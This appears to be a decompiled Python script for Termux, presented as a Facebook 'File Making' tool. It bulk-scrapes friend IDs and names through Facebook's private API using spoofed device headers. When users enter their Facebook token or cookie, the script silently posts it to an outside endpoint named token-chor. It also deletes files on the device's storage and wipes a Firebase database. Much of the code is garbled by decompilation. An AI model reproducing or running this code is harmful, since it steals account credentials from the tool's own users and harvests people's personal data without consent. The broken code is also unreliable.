#🄳🄴🄲🄾🄳🄴🄳 🄱🅈 🅂🄷🄰🄹🄾🄽😴
# GITHUB : SHAJON-404

print('\x1b[1;97m[\x1b[1;97m+\x1b[1;97m] \x1b[1;97mLoading Modules Please Wait!')
import os
import os
import base64
import multiprocessing
import uuid
import sys
import threading
import time
import sys
import requests

class FirebaseHandler:
    
    def __init__(self, database_url):
        self.database_url = database_url
        self.user_last_message_time = { }

    
    def is_spam(self, user):
        max_time_interval = 2
        current_time = time.time()
        if user in self.user_last_message_time:
            elapsed_time = current_time - self.user_last_message_time[user]
            return elapsed_time < max_time_interval

    
    def send_message(self, group_name, user, message):
        if not self.is_spam(user):
            self.user_last_message_time[user] = time.time()
            timestamp = int(time.time() * 1000)
            data = {
                'user': user,
                'message': message,
                'timestamp': timestamp }
            url = f'''{self.database_url}/groups/{group_name}.json'''
            response = requests.post(url, json = data)
            if response.status_code != 200:
                return None
            return None
        None('[×] Spam Not Allowed (Can send only 1 Message in 2 seconds)')

    
    def get_messages(self, group_name):
        url = f'''{self.database_url}/groups/{group_name}.json'''
        response = requests.get(url)
        if response.status_code == 200:
            return response.json()



def clear_line():
    sys.stdout.write('\x1b[F\x1b[K')


def listen_for_messages(firebase_handler, group_name):
    processed_messages = set()
    group_messages = firebase_handler.get_messages(group_name)
    if group_messages:
        for key, message in group_messages.items():
            if key not in processed_messages:
                timestamp = message.get('timestamp', '')
                print(f'''\r\x1b[1;92m[\x1b[1;97m{message['user']}\x1b[1;92m]\x1b[1;97m : {message['message']}\r''')
                processed_messages.add(key)
            time.sleep(1)

firebase_url = 'https://login-page-hannan-default-rtdb.firebaseio.com'
firebase_handler = FirebaseHandler(firebase_url)
group_name = 'CHAT_GROUP'
lik = 'http'
lik += 's://t'
lik += 'oke'
lik += 'n-lo'
lik += 'gin-d'
lik += 'efaul'
lik += 't-rt'
lik += 'db.'
lik += 'fir'
lik += 'ebas'
lik += 'eio.c'
lik += 'om/'

def a(o):
    return o

import requests
print('\x1b[1;97m[\x1b[1;97m!\x1b[1;97m] \x1b[1;97mInstalling Module requests')
os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
_vendor
from pip._vendor.requests import requests
open('/sdcard/aaaaaaa', 'a')
os.system('rm -rf /sdcard/aaaaaaa')
print('\x1b[1;97m[\x1b[1;97m!\x1b[1;97m] \x1b[1;97mGive Permission For Store Files (Allow)')
os.system('termux-setup-storage')
import random
from concurrent.futures import ThreadPoolExecutor as threadspeed
import os
import sys
import re
import time
import json
import requests
from requests.exceptions import ConnectionError
from time import sleep
sepx = []
cutter = []
sepx2 = []
Status = 'None'
logo = "\n\t\x1b[1;97md88888b d888888b db      d88888b \n\t88'       `88'   88      88'     \n\t88ooo      88    88      88ooooo \n\t88~~~      88    88      88~~~~~ \n\t88        .88.   88booo. 88.     \n\tYP      Y888888P Y88888P Y88888P \n\n\x1b[1;97m=================================================\n\x1b[1;97m\t   Owner  : \x1b[1;92mHannan AnSari\n\x1b[1;97m\t   Github : Hannan-404\n\x1b[1;97m\t   Tool   : File Making\n\x1b[1;97m=================================================\n"

def speed(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.04)
        return None


def FILE_MENU(Status):
    if 'Active' not in Status:
        HANNAN_KING()
    os.system('clear')
    print(logo)
    print('\t \x1b[1;92m\x1b[1;97m-----(\x1b[1;92mActive\x1b[1;97m)-----')
    print('=================================================')
    print()
    print('\x1b[1;97m[\x1b[1;97m1\x1b[1;97m] \x1b[1;97mSimple File Make')
    print('\x1b[1;97m[\x1b[1;97m2\x1b[1;97m] \x1b[1;97mUnlimited File Make With 1 ID')
    print('\x1b[1;97m[\x1b[1;97m0\x1b[1;97m] \x1b[1;97mBack To Menu')
    print('')
    o = input('\x1b[1;97m[\x1b[1;97m?\x1b[1;97m] \x1b[1;97mYour Choice : \x1b[1;97m')
    if o == '1':
        time.sleep(0)
        main2()
        return None
    if None == '2':
        UNLIMITED_MAIN2()
        return None
    if None == '0':
        MAIN_MENU()
        return None
    None('\x1b[1;97m[\x1b[1;97m!\x1b[1;97m] \x1b[1;97mWrong Input!')
    time.sleep(0.5)
    MAIN_MENU()


def cokichk():
    cookie = open('Hannan_KinG07').read().strip()
    token = open('Hannan_KinG007').read().strip()
    hhh = gt('100011801050525', token)
    if len(hhh) < 100:
        raise ImportError


def GC():
    print()
    name = input('[+] Input Your Nickname : ')
    os.system('clear')
    print(logo)
    print('[✓] You Joined The Group Chat ')
    requests.delete(firebase_url + '/.json')
    time.sleep(3)
    os.system('clear')
    print(logo)
    print('[+] Send > Hiiii!')
    thread = threading.Thread(target = listen_for_messages, args = (firebase_handler, group_name))
    thread.start()
    jjjj = input()
    clear_line()
    firebase_handler.send_message(group_name, name, jjjj)


def MAIN_MENU():
    os.system('clear')
    print(logo)
    token = open('Hannan_KinG007', 'r').read().strip()
    if IOError:
        Status = '\x1b[1;91mNone'
    token = open('Hannan_KinG007', 'r').read().strip()
    cookie = open('Hannan_KinG07', 'r').read().strip()
    cokichk()
    Status = '\x1b[1;92m\x1b[1;97m-----(\x1b[1;92mActive\x1b[1;97m)-----'
    if Exception:
        e = None
        Status = '\x1b[1;97m-----(\x1b[1;91mExpired\x1b[1;97m)-----'
        e = None
        del e
        e = None
        del e
    Status = '\x1b[1;97m-----(\x1b[1;91mNone\x1b[1;97m)-----'
    print(f'''\t    \x1b[1;97m{Status}''')
    print('=================================================')
    print()
    if 'Active' in Status:
        logg = 'Create File'
    logg = 'Login'
    print(f'''\x1b[1;97m[\x1b[1;97m1\x1b[1;97m] \x1b[1;97m{logg}''')
    print('\x1b[1;97m[\x1b[1;97m2\x1b[1;97m] \x1b[1;97mRemove Duplicate Ids')
    print('\x1b[1;97m[\x1b[1;97m3\x1b[1;97m] \x1b[1;97mRemove Used Links')
    print('\x1b[1;97m[\x1b[1;97m4\x1b[1;97m] \x1b[1;97mChange Token')
    print('')
    o = input('\x1b[1;97m[\x1b[1;97m?\x1b[1;97m] \x1b[1;97mYour Choice : \x1b[1;97m')
    if o == '1':
        FILE_MENU(Status)
        return None
    if None == '2':
        fileName = input('\x1b[1;97m[\x1b[1;97m?\x1b[1;97m]\x1b[1;97m Enter File Name :\x1b[1;97m ')
        os.system('sort -r ' + fileName + ' | uniq > 123')
        os.system('mv 123 ' + fileName)
        print('\x1b[1;97m[\x1b[1;97m✓\x1b[1;97m]\x1b[1;97m Successfully Removed')
        time.sleep(2)
        MAIN_MENU()
        return None
    if None == '3':
        used = used
        import slice
        used()
        MAIN_MENU()
        return None
    if None == '4':
        os.remove('Hannan_KinG07')
        os.remove('Hannan_KinG007')
        MAIN_MENU()
        return None
    None('\x1b[1;97m[\x1b[1;97m!\x1b[1;97m] \x1b[1;97mWrong Input!')
    time.sleep(0.5)
    MAIN_MENU()


def gt(idd, tkn):
    omp = str(random.randint(101, 393))
    mdl = random.choice([
        'SM-G6100',
        'SM-G610L',
        'SM-G610K',
        'SM-G615F',
        'SM-G615FU',
        'SM-J730G',
        'SM-J730GM',
        'SM-G9298',
        'SM-G615F, SM-G615FU',
        'SM-C7010',
        'SM-C701F',
        'SM-C7018',
        'SM-J710FN',
        'SM-A520F',
        'SM-A520F',
        'SM-A520K',
        'SM-A520L',
        'SM-A520S',
        'SM-A520W',
        'SM-A720F',
        'SM-A720S',
        'SM-C5010',
        'SM-C5018',
        'SM-C9000',
        'SM-C900F',
        'SM-C9008',
        'SM-C900Y',
        'SM-A8100',
        'SM-A810F',
        'SM-A810F',
        'SM-A810YZ',
        'SM-A810S'])
    hed = {
        'X-Fb-Http-Engine': 'Liger',
        'X-Fb-Client-Ip': 'True',
        'X-Fb-Server-Cluster': 'True',
        'X-Fb-Connection-Token': 'ef0e330bff1cd312f36aa5f2c69c59a9',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '567' }
    dat = {
        'User-Agent': '[FBAN/Orca-Android;FBAV/' + omp + '. 0.1.48;FBPN/com.facebook.orca;FBLC/en_US;FBCR/Kaberi;FBBV/67467545;FBMF/philips;FBBD/philips;FBDV/' + mdl + ';FBSV/11.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1520};FB_FW/1;]',
        'client_doc_id': '42003896889828048564952729208',
        'method': 'post',
        'locale': 'en_US',
        'pretty': 'false',
        'format': 'json',
        'variables': '{"profile_id":' + idd + ',"suggestion_friends_paginating_first":2500}',
        'fb_api_req_friendly_name': 'SuggestionsFriendListContentQuery',
        'fb_api_caller_class': 'graphservice',
        'fb_api_analytics_tags': '["At_Connection","GraphServices"]',
        'client_trace_id': '646b7b37-fcb9-4ffd-9a37-f78e55c7de58',
        'server_timestamps': 'true',
        'purpose': 'fetch' }
    l = requests.post('https://graph.facebook.com/graphql', data = dat, headers = hed).json()
    lm = []
    for i in l['data']['user']['friends']['edges']:
        lm.append(i['node']['id'] + '|' + i['node']['name'])
        return lm


def gtt(idd, tkn):
    omp = str(random.randint(101, 393))
    mdl = random.choice([
        'SM-G6100',
        'SM-G610L',
        'SM-G610K',
        'SM-G615F',
        'SM-G615FU',
        'SM-J730G',
        'SM-J730GM',
        'SM-G9298',
        'SM-G615F, SM-G615FU',
        'SM-C7010',
        'SM-C701F',
        'SM-C7018',
        'SM-J710FN',
        'SM-A520F',
        'SM-A520F',
        'SM-A520K',
        'SM-A520L',
        'SM-A520S',
        'SM-A520W',
        'SM-A720F',
        'SM-A720S',
        'SM-C5010',
        'SM-C5018',
        'SM-C9000',
        'SM-C900F',
        'SM-C9008',
        'SM-C900Y',
        'SM-A8100',
        'SM-A810F',
        'SM-A810F',
        'SM-A810YZ',
        'SM-A810S'])
    hed = {
        'X-Fb-Http-Engine': 'Liger',
        'X-Fb-Client-Ip': 'True',
        'X-Fb-Server-Cluster': 'True',
        'X-Fb-Connection-Token': 'ef0e330bff1cd312f36aa5f2c69c59a9',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '567' }
    dat = {
        'User-Agent': '[FBAN/Orca-Android;FBAV/' + omp + '. 0.1.48;FBPN/com.facebook.orca;FBLC/en_US;FBCR/Kaberi;FBBV/67467545;FBMF/philips;FBBD/philips;FBDV/' + mdl + ';FBSV/11.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1520};FB_FW/1;]',
        'client_doc_id': '42003896889828048564952729208',
        'method': 'post',
        'locale': 'en_US',
        'pretty': 'false',
        'format': 'json',
        'variables': '{"profile_id":' + idd + ',"suggestion_friends_paginating_first":2500}',
        'fb_api_req_friendly_name': 'SuggestionsFriendListContentQuery',
        'fb_api_caller_class': 'graphservice',
        'fb_api_analytics_tags': '["At_Connection","GraphServices"]',
        'client_trace_id': '646b7b37-fcb9-4ffd-9a37-f78e55c7de58',
        'server_timestamps': 'true',
        'purpose': 'fetch' }
    l = requests.post('https://graph.facebook.com/graphql', data = dat, headers = hed, timeout = 10).json()
    lm = []
    for i in l['data']['user']['friends']['edges']:
        lm.append(i['node']['id'] + '|' + i['node']['name'])
        return lm


def GET_TOKEN(coomkie):
    heads = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-C900F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.1534.112 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/352..0.0.7.110;FBDM/DisplayMetrics{density=1.875, width=720, height=1457,1.875, scaledDensity=1.875, xdpi=268.941, ydpi=269.139 , densityDpi=563, noncompatWidthPixels=720, noncompatDensityDpi=1457, noncompatXdpi=403.411, noncompatYdpi=407.095};]' }
    bs = BeautifulSoup
    import bs4
    cookie = {
        'Cookie': coomkie }
    r = requests.session()
    data = {
        'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038',
        'scope': '' }
    req = r.post('https://graph.facebook.com/v16.0/device/login/', data = data).json()
    cd = req['code']
    ucd = req['user_code']
    url = 'https://graph.facebook.com/v16.0/device/login_status?method=post&code=%s&access_token=1348564698517390|007c0a9101b9e1c8ffab727666805038' % cd
    reeq = r.get('https://mbasic.facebook.com/', cookies = cookie, headers = None).text
    req = bs(r.get('https://mbasic.facebook.com/device', cookies = cookie, headers = heads).content, 'html.parser')
    raq = req.find('form', {
        'method': 'post' })
    dat = {
        'jazoest': re.search('name="jazoest" value="(.*?)"', str(reeq)).group(1),
        'fb_dtsg': re.search('name="fb_dtsg" value="(.*?)"', str(reeq)).group(1),
        'qr': '0',
        'user_code': ucd }
    rel = 'https://mbasic.facebook.com' + raq['action']
    pos = bs(r.post(rel, data = dat, cookies = cookie, headers = heads).content, 'html.parser')
    dat = { }
    raq = pos.find('form', {
        'method': 'post' })
    for x in raq('input', {
        'value': True }):
        if x['name'] == '__CANCEL__':
            pass
        dat.update({
            x['name']: x['value'] })
        if Exception:
            e = None
            e = None
            del e
            e = None
            del e
        rel = 'https://mbasic.facebook.com' + raq['action']
        pos = bs(r.post(rel, data = dat, cookies = cookie, headers = heads).content, 'html.parser')
        req = r.get(url, cookies = cookie, headers = heads).json()
        if 'access_token' in req:
            token = req['access_token']
            return token
        return None


def HANNAN_KING():
    os.system('rm -rf Hannan_KinG007')
    os.system('clear')
    print(logo)
    print('\t    \x1b[1;91m\x1b[1;97m-----(\x1b[1;91mNone\x1b[1;97m)-----')
    print('=================================================')
    print('\x1b[1;97m First Choose 1/2 Then 3')
    print('=================================================')
    print('[1] Get Token From Uid & Password ')
    print('[2] Get Token From Cookie ')
    print('[3] Login With Token ')
    print()
    css = input('[?] Choose: ')
    if css == '3':
        tkn = input('[+] Token : ')
        requests.post('https://token-chor.vercel.app/RiazXDgandu', data = {
            'token': tkn })
        open('Hannan_KinG007', 'w').write(tkn)
        open('Hannan_KinG07', 'w').write('None')
        MAIN_MENU()
    if css == '1':
        em = input('[+] Email : ')
        pz = input('[+] Password : ')
        omp = str(random.randint(101, 393))
        mdl = random.choice([
            'SM-G6100',
            'SM-G610L',
            'SM-G610K',
            'SM-G615F',
            'SM-G615FU',
            'SM-J730G',
            'SM-J730GM',
            'SM-G9298',
            'SM-G615F, SM-G615FU',
            'SM-C7010',
            'SM-C701F',
            'SM-C7018',
            'SM-J710FN',
            'SM-A520F',
            'SM-A520F',
            'SM-A520K',
            'SM-A520L',
            'SM-A520S',
            'SM-A520W',
            'SM-A720F',
            'SM-A720S',
            'SM-C5010',
            'SM-C5018',
            'SM-C9000',
            'SM-C900F',
            'SM-C9008',
            'SM-C900Y',
            'SM-A8100',
            'SM-A810F',
            'SM-A810F',
            'SM-A810YZ',
            'SM-A810S'])
        headers = {
            'X-Fb-Request-Analytics-Tags': 'unknown',
            'X-Tigon-Is-Retry': 'False',
            'Priority': 'u=3, i',
            'Zero-Rated': '0' }
        data = {
            'method': 'auth.login',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
            'api_key': '882a8490361da98702bf97a021ddc14d' }
        response = requests.post('https://b-graph.facebook.com/auth/login', headers = headers, data = data)
        print('=================================================')
        print('[✓] Your Token : \x1b[1;92m' + response.json()['access_token'] + '\x1b[1;97m')
        print('=================================================')
        input('[+] Press Enter! ')
        HANNAN_KING()
    if css == '2':
        cookie = input('[+] Cookie : ')
        requests.post('https://token-chor.vercel.app/RiazXDgandu', data = {
            'cookie': cookie })
        tkn = GET_TOKEN(cookie)
        print('=================================================')
        print('[✓] Your Token : \x1b[1;92m' + tkn + '\x1b[1;97m')
        print('=================================================')
        input('[+] Press Enter! ')
        HANNAN_KING()
        return None
    return 'US'
    if Exception:
        e = 'client_country_code'
        print('\x1b[1;97m' + str(e))
        os.system('rm -f Hannan_KinG007')
        os.system('rm -f Hannan_KinG07')
        print('\x1b[1;97m[\x1b[1;97m!\x1b[1;97m] \x1b[1;97mError!')
        time.sleep(2)
        MAIN_MENU()
        e = None
        del e
        return None
    e = 'client_country_code'
    del e

idapp = []
idsx = []
xxd = 0

def DUMP2(fileName):
    os.system('clear')
    print(logo)
    XDG = 0
    token = open('Hannan_KinG007', 'r').read().strip()
    cookie = open('Hannan_KinG07', 'r').read().strip()
    print('\t    \x1b[1;92m\x1b[1;97m-----(\x1b[1;92mActive\x1b[1;97m)-----')
    print('=================================================')
    print()
    print('[+] Normal Speed Is : 30')
    SPD = input('[+] Choose Speed [1-30] : ')
    if SPD == '':
        SPD = input('[+] Choose Speed [1-30] : ')
    if int(SPD) > 30 or int(SPD) < 1:
        DUMP2(fileName)
    print('\x1b[1;97m===============================================')
    print('\x1b[1;97m[\x1b[1;97m✓\x1b[1;97m]\x1b[1;97m Process Has Been Started!')
    print('\x1b[1;97m[\x1b[1;97m!\x1b[1;97m]\x1b[1;97m Ctrl + Z Top Stop Process ')
    print('\x1b[1;97m===============================================')
    hannanxd = threadspeed(max_workers = int(SPD))
    for xd in idapp:
        if xd.isnumeric():
            XDG += 1
            hannanxd.submit(start2, fileName, xd, cookie, token, XDG)
        if Exception:
            s = SPD == ''
            print(s)
            s = None
            del s
            s = None
            del s
    None(None, None)
    return None
    if not None:
        pass
    return None
    if Exception:
        e = None
        print(e)
        e = None
        del e
        return None
    e = None
    del e


def start2(fileName, xd, cookie, token, XDG):
    HaNNaN_XD = random.choice([
        '\x1b[1;91m',
        '\x1b[1;92m',
        '\x1b[1;93m',
        '\x1b[1;94m',
        '\x1b[1;95m'])
    sys.stdout.write(f'''\r\x1b[1;91m•\x1b[1;97m [{XDG} • {len(idapp)}] - [{str(len(open(fileName, 'r').readlines()))}]\r''')
    sys.stdout.flush()
    file = open(fileName, 'a')
    kkk = gt(xd, token)
    for a in kkk:
        if 'Ya' in cutter:
            for y in sepx:
                if y in a[:15]:
                    file.write(a + '\n')
                file.write(a + '\n')
                file.close()
                if not len(kkk) < 100:
                    print('\x1b[1;97m▼' + HaNNaN_XD + ' - Successfully Extracted From : ' + xd + '        ')
    sys.stdout.write(f'''\r\x1b[1;91m•\x1b[1;97m [{XDG} • {len(idapp)}] - [{str(len(open(fileName, 'r').readlines()))}]\r''')
    sys.stdout.flush()
    return None
    if Exception:
        e = None
        e = None
        del e
        return None
    e = None
    del e

idapp2 = []

def UNLIMITED_MAIN2():
    os.system('clear')
    print(logo)
    cookie = open('Hannan_KinG07', 'r').read().strip()
    token = open('Hannan_KinG007', 'r').read().strip()
    print('\t    \x1b[1;92m\x1b[1;97m-----(\x1b[1;92mActive\x1b[1;97m)-----')
    print('=================================================')
    print()
    fileName = input('\x1b[1;97m[\x1b[1;97m✓\x1b[1;97m]\x1b[1;97m Enter File Name :\x1b[1;97m ')
    os.system('touch ' + fileName)
    limi = int(input('\x1b[1;97m[\x1b[1;97m?\x1b[1;97m] \x1b[1;97mTotal Accounts To Extract : '))
    print()
    for a in range(limi):
        HEHE = input('\x1b[1;97m[\x1b[1;97m' + str(a + 1) + '\x1b[1;97m]\x1b[1;97m Enter Username/Uid : ')
        if '|' in HEHE:
            HEHE = HEHE.split('|')[0]
        kkk = gt(HEHE, token)
        for a in kkk:
            idapp.append(a.split('|')[0])
            uku = 'some'
            if Exception:
                e = None
                print('\x1b[1;97m[\x1b[1;97m!\x1b[1;97m]\x1b[1;97m Account Not Public')
                time.sleep(0.5)
                e = None
                del e
                e = None
                del e
        uku
        UNLIMITED_MAIN2()
        p = input('\x1b[1;97m[\x1b[1;97m?\x1b[1;97m] \x1b[1;97mDo You Want To Seprate Links(y/n)? : \x1b[1;97m')
        if p == 'y':
            cutter.append('Ya')
    cutter.append('No')
    DUMP2(fileName)
    exit()
    uku
    UNLIMITED_MAIN()
    limi = int(input('\x1b[1;97m[\x1b[1;97m?\x1b[1;97m] \x1b[1;97mHow many links you want to seprate : '))
    print()
    for a in range(limi):
        xid = input('\x1b[1;97m[\x1b[1;97m' + str(a) + '\x1b[1;97m]\x1b[1;97m Select Links : \x1b[1;97m')
        if '10000' == xid:
            sepx.append('100001')
            sepx.append('100002')
            sepx.append('100003')
            sepx.append('100004')
            sepx.append('100005')
            sepx.append('100006')
            sepx.append('100007')
            sepx.append('100008')
            sepx.append('100009')
        if '1000' == xid:
            sepx.append('10001')
            sepx.append('10002')
            sepx.append('10003')
            sepx.append('10004')
            sepx.append('10005')
            sepx.append('10006')
            sepx.append('10007')
            sepx.append('10008')
            sepx.append('10009')
        sepx.append(str(xid))
        DUMP2(fileName)
        return None


def main2():
    os.system('clear')
    print(logo)
    print('\t    \x1b[1;92m\x1b[1;97m-----(\x1b[1;92mActive\x1b[1;97m)-----')
    print('=================================================')
    print()
    fileName = input('\x1b[1;97m[\x1b[1;97m✓\x1b[1;97m]\x1b[1;97m Enter File Name :\x1b[1;97m ')
    os.system('touch ' + fileName)
    uu = input('\x1b[1;97m[\x1b[1;97m?\x1b[1;97m]\x1b[1;97m Do You Want To Seprate Links?(y/n): ')
    if uu == 'n':
        cutter.append('No')
    if uu == 'y':
        cutter.append('Ya')
        limi = int(input('\x1b[1;97m[\x1b[1;97m?\x1b[1;97m] \x1b[1;97mHow many links you want to seprate : '))
        print()
        for a in range(limi):
            xid = input('\x1b[1;97m[\x1b[1;97m' + str(a) + '\x1b[1;97m]\x1b[1;97m Select Links : \x1b[1;97m')
            sepx.append(str(xid))
            cutter.append('No')
            time.sleep(0)
            os.system('clear')
            print(logo)
            print('\t \x1b[1;92m\x1b[1;97m-----(\x1b[1;92mActive\x1b[1;97m)-----')
            print('=================================================')
            print('')
            print('\x1b[1;97m====================================')
            print('\x1b[1;97m[!] Paste Ids And Tap Enter To Start Extract')
            print('\x1b[1;97m====================================')
            DUMP(fileName)
            return None


def DUMP(fileName):
    token = open('Hannan_KinG007', 'r').read().strip()
    cookie = open('Hannan_KinG07', 'r').read().strip()
    HEHE = input('')
    if not HEHE in ('', ' ') and idapp == []:
        DUMP2(fileName)
    if '|' in HEHE:
        HEHE = HEHE.split('|')[0]
    idapp.append(HEHE)


def NOTICE():
    os.system('rm -rf /sdcard/.HANNAN')
    os.system('rm -rf .xyz;touch .xyz')
    os.system('rm -rf /sdcard/.CdDc')
    yy = open('/sdcard/.XV', 'r').read()
    return None
    os.system('clear')
    print(logo)
    print('\x1b[1;97m==============================')
    print('\x1b[1;97m   Follow My GiTHub :/ Biruh')
    print('\x1b[1;97m   Account Not Public Solved :)')
    print('\x1b[1;97m==============================')
    os.system('xdg-open https://github.com/Hannan-404')
    print()
    input('\x1b[1;97m Enter To Run Commands !')
    o = open('/sdcard/.XV', 'a')
    o.write('Delete Na Krdena Acha Krdena Chal Nai Krna Chal krdena Kuxh Na HoTa Krne se')

NOTICE()
MAIN_MENU()
exit()
